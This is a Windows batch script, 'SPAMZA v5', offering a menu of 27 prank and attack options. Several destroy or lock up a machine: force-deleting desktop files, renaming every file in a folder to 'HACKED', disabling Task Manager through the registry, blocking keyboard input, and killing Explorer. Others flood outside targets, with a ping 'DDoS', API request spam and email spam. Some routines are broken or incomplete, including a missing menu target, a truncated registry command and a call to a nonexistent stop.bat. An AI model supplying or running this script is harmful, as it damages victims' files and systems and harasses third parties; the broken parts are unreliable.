@echo off
title SPAMZA v5 - ULTIMATE MAYHEM
color 0C
mode con: cols=60 lines=35

:menu
cls
echo ==========================================
echo          SPAMZA v5 - ULTIMATE MAYHEM
echo ==========================================
echo [1] Message spam (SendKeys)
echo [2] API spam (GET/POST)
echo [3] CMD window spam (infinite mode)
echo [4] File spam (normal/random)
echo [5] Crash Windows Explorer
echo [6] Restart / Shutdown PC
echo [7] DDoS attack (Ping flood)
echo [8] RAM crash (100% CPU)
echo [9] Windows spam (infinite apps)
echo [10] Fake Windows update
echo [11] Fake virus (BSOD)
echo [12] Email spam (SMTP)
echo [13] Hard drive crash (fill storage)
echo [14] Fake format (scary prank)
echo [15] Lock keyboard (PowerShell)
echo [16] Crazy mouse (PowerShell)
echo [17] Disable WiFi
echo [18] Auto-spam WhatsApp / Messenger
echo [19] Invert keyboard keys
echo [20] Rename all files (HACKED)
echo [21] Disable keyboard and mouse
echo [22] Delete desktop icons (prank)
echo [23] Infinite printer spam
echo [24] Google Chrome troll (1000 tabs)
echo [25] Windows "Prison Mode" (disable shortcuts)
echo [26] Taskbar bug (make it disappear)
echo [27] Speak message (robot voice)
echo [28] Quit
echo ==========================================
set /p choice=Choose an option:

if "%choice%"=="1" goto spam_msg
if "%choice%"=="2" goto spam_api
if "%choice%"=="3" goto spam_cmd
if "%choice%"=="4" goto spam_files
if "%choice%"=="5" goto crash_explorer
if "%choice%"=="6" goto power_options
if "%choice%"=="7" goto ddos
if "%choice%"=="8" goto crash_ram
if "%choice%"=="9" goto spam_windows
if "%choice%"=="10" goto fake_update
if "%choice%"=="11" goto fake_virus
if "%choice%"=="12" goto email_spam
if "%choice%"=="13" goto hard_drive_crash
if "%choice%"=="14" goto fake_format
if "%choice%"=="15" goto lock_keyboard
if "%choice%"=="16" goto crazy_mouse
if "%choice%"=="17" goto disable_wifi
if "%choice%"=="18" goto auto_spam
if "%choice%"=="19" goto invert_keys
if "%choice%"=="20" goto rename_files
if "%choice%"=="21" goto disable_input
if "%choice%"=="22" goto delete_icons
if "%choice%"=="23" goto printer_spam
if "%choice%"=="24" goto chrome_troll
if "%choice%"=="25" goto prison_mode
if "%choice%"=="26" goto taskbar_bug
if "%choice%"=="27" goto speak_message
if "%choice%"=="28" exit

echo Invalid option!
pause
goto menu

:: ==============================
:: Message Spam (SendKeys)
:: ==============================
:spam_msg
cls
set /p message=Enter message to spam:
set /p count=Number of times:
echo Place your cursor in the input field...
timeout /t 5 >nul
for /l %%i in (1,1,%count%) do (
    powershell -Command "$wshell = New-Object -ComObject WScript.Shell; $wshell.SendKeys('%message%{ENTER}')"
    timeout /t 1 >nul
)
goto menu

:: ==============================
:: API Spam (GET/POST)
:: ==============================
:spam_api
cls
set /p url=Enter the API URL to spam:
set /p count=Number of requests:
for /l %%i in (1,1,%count%) do (
    curl -X GET %url%
)
goto menu

:: ==============================
:: CMD Window Spam (Infinite Mode)
:: ==============================
:spam_cmd
cls
echo This will open infinite command prompt windows.
set /p count=How many windows do you want to open?:
for /l %%i in (1,1,%count%) do (
    start cmd
)
goto menu

:: ==============================
:: File Spam (Normal/Random)
:: ==============================
:spam_files
cls
set /p folder=Enter the folder path to spam:
set /p count=Number of files to create:
for /l %%i in (1,1,%count%) do (
    echo SPAM > "%folder%\spam_%%i.txt"
)
goto menu

:: ==============================
:: Crash Windows Explorer
:: ==============================
:crash_explorer
cls
echo This will crash Windows Explorer.
echo Are you sure? (Y/N):
set /p choice=Choice:
if /i "%choice%"=="Y" (
    taskkill /f /im explorer.exe
)
goto menu

:: ==============================
:: Restart / Shutdown PC
:: ==============================
:power_options
cls
echo Restart or shutdown the PC?
echo [1] Restart
echo [2] Shutdown
set /p choice=Choose an option:
if "%choice%"=="1" shutdown /r /f /t 0
if "%choice%"=="2" shutdown /s /f /t 0
goto menu

:: ==============================
:: DDoS Attack (Ping flood)
:: ==============================
:ddos
cls
set /p ip=Enter target IP address:
echo WARNING: This will flood the target with ping requests.
set /p count=Number of pings:
ping -n %count% %ip%
goto menu

:: ==============================
:: RAM Crash (100% CPU)
:: ==============================
:crash_ram
cls
echo This will stress the CPU and RAM.
echo Are you sure? (Y/N):
set /p choice=Choice:
if /i "%choice%"=="Y" (
    start "" /b cmd /c "while (1) {echo Crash!}"
)
goto menu

:: ==============================
:: Windows Spam (Infinite Apps)
:: ==============================
:spam_windows
cls
echo WARNING: This will open many applications!
set /p count=How many windows to open?:
for /l %%i in (1,1,%count%) do (
    start notepad
)
goto menu

:: ==============================
:: Fake Windows Update
:: ==============================
:fake_update
cls
echo Simulating a fake Windows update...
echo 0% [#############################] 0%
timeout /t 10 >nul
echo 50% [##########################] 50%
timeout /t 10 >nul
echo 100% [########################] 100%
timeout /t 5 >nul
goto menu

:: ==============================
:: Fake Virus (BSOD)
:: ==============================
:fake_virus
cls
echo This will simulate a fake Blue Screen of Death (BSOD).
timeout /t 5 >nul
start "" "C:\Windows\System32\stop.bat"
goto menu

:: ==============================
:: Email Spam (SMTP)
:: ==============================
:email_spam
cls
set /p email=Enter email to spam:
set /p count=How many emails to send?:
for /l %%i in (1,1,%count%) do (
    echo "Subject: Spam" | sendmail /to %email% /subject "Spam" /message "This is a spam message."
)
goto menu

:: ==============================
:: Hard Drive Crash (Fill Storage)
:: ==============================
:hard_drive_crash
cls
set /p folder=Enter folder path to fill:
set /p size=Enter size in MB to create:
fsutil file createnew "%folder%\file.txt" %size%
goto menu

:: ==============================
:: Fake Format (Scary Prank)
:: ==============================
:fake_format
cls
echo WARNING: Your hard drive will be formatted!
timeout /t 5 >nul
echo Simulating format...
timeout /t 3 >nul
goto menu

:: ==============================
:: Lock Keyboard (PowerShell)
:: ==============================
:lock_keyboard
cls
echo Locking keyboard...
powershell -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Keyboard{[DllImport(\"user32.dll\")] public static extern int BlockInput(bool block);}' -PassThru | [Keyboard]::BlockInput($true)"
goto menu

:: ==============================
:: Crazy Mouse (PowerShell)
:: ==============================
:crazy_mouse
cls
echo Crazy mouse movement will start...
powershell -Command "$wshell = New-Object -ComObject WScript.Shell; while ($true) { $wshell.SendKeys('{UP}'); $wshell.SendKeys('{DOWN}') }"
goto menu

:: ==============================
:: Disable WiFi
:: ==============================
:disable_wifi
cls
echo Disabling WiFi...
powershell -Command "(Get-NetAdapter -Name 'Wi-Fi').Disable()"
goto menu

:: ==============================
:: Invert Keyboard Keys
:: ==============================
:invert_keys
cls
echo WARNING: This will scramble your keyboard!
pause
powershell -Command "New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -Value ([byte[]](0x00"
goto menu

:: ==============================
:: Rename all files (HACKED)
:: ==============================
:rename_files
cls
set /p path=Enter folder path:
if not exist "%path%" (
    echo Folder not found!
    pause
    goto menu
)
for %%f in ("%path%\*.*") do ren "%%f" "HACKED-%%~nxf"
goto menu

:: ==============================
:: Disable Keyboard and Mouse
:: ==============================
:disable_input
cls
echo WARNING: This will lock your keyboard and mouse!
pause
powershell -Command "Disable-ProcessMitigation -Name explorer.exe"
goto menu

:: ==============================
:: Delete Desktop Icons
:: ==============================
:delete_icons
cls
echo Deleting all desktop icons...
del /Q /F "%userprofile%\Desktop\*.*"
goto menu

:: ==============================
:: Infinite Printer Spam
:: ==============================
:printer_spam
cls
echo WARNING: This will spam your printer!
pause
for /l %%i in (1,1,100) do (
    echo SPAM PAGE %%i | notepad /p
)
goto menu

:: ==============================
:: Google Chrome Troll (1000 Tabs)
:: ==============================
:chrome_troll
cls
echo WARNING: This will open 1000 Chrome tabs!
pause
for /l %%i in (1,1,1000) do (
    start chrome "https://www.google.com/search?q=spamza"
)
goto menu

:: ==============================
:: Windows "Prison Mode"
:: ==============================
:prison_mode
cls
echo Enabling Windows Prison Mode...
powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'DisableTaskMgr' -Value 1 -PropertyType DWord -Force"
goto menu

:: ==============================
:: Taskbar Bug (Hide forever)
:: ==============================
:taskbar_bug
cls
echo Hiding taskbar...
powershell -Command "Stop-Process -Name explorer -Force"
goto menu

:: ==============================
:: Speak Message (Robot Voice)
:: ==============================
:speak_message
cls
set /p message=Enter message to speak:
powershell -Command "$speak = New-Object -ComObject SAPI.SpVoice; $speak.Speak('%message%')"
goto menu
